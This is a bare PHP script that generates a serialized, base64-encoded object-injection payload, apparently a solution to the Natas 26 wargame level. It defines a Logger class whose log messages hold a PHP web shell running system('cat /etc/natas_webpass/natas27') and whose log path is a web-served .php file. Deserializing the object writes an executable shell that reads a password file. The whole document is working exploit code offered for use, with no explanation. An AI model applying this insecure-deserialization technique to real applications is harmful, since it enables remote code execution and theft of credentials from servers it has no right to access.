<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="<?php echo system('cat /etc/natas_webpass/natas27');?>";
            $this->exitMsg="<?php echo system('cat /etc/natas_webpass/natas27');?>";
            $this->logFile = "img/natasExec.php";
	
                    }
	function __destruct(){
	
}
    }
	$logger = new Logger("");
	echo base64_encode(serialize($logger));
	echo "\n";
?>
